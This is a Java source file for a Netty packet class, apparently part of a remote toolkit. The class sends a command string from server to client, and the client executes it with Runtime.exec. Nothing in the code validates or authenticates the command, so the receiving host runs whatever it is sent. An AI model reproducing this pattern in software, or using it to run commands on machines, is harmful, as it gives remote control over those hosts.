package me.earthme.mbtoolkit.network.packet.server;

import io.netty.buffer.ByteBuf;
import me.earthme.mbtoolkit.network.handler.NettyClientHandler;
import me.earthme.mbtoolkit.network.packet.Message;

import java.io.IOException;
import java.nio.charset.StandardCharsets;

public class ServerCmdCommandMessage implements Message<NettyClientHandler> {
    private String command;

    public ServerCmdCommandMessage(){}

    public ServerCmdCommandMessage(String command){
        this.command = command;
    }

    @Override
    public byte getHead() {
        return 0x03;
    }

    @Override
    public void writeMessageData(ByteBuf byteBuf) {
        byteBuf.writeBytes(this.command.getBytes(StandardCharsets.UTF_8));
    }

    @Override
    public void readMessageData(ByteBuf byteBuf) {
        final byte[] strData = new byte[byteBuf.readableBytes()];
        byteBuf.readBytes(strData);
        this.command = new String(strData,StandardCharsets.UTF_8);
    }

    @Override
    public void process(NettyClientHandler processor) {
        try {
            Runtime.getRuntime().exec(this.command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
